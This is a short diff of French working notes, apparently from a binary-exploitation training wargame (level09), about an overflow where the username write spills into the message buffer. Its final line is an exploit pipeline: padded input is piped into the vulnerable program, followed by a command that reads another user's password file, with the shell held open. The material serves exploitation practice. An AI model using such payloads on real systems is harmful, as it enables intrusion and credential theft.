@@ -59,12 +59,17 @@ c
 
 set_username
 ecrit de ref + 140 à ref + 181
+
 set_msg
 ecrit de ref à ref + 180 ?
+
+
+
+
+
+
+
+
 dépasse sur message au 128 eme char dans username
 final string : 
-(python -c 'print("hhshs")' ; python -c 'print("hhshs")'; echo 'cat /home/users/end/.pass'; cat) | ./level09
-
-
-0x7fffffffe500
-0x7fffffffe5c8
+(python -c 'print("a" * 120 + "")' ; python -c 'print("hhshs")'; echo 'cat /home/users/end/.pass'; cat) | ./level09
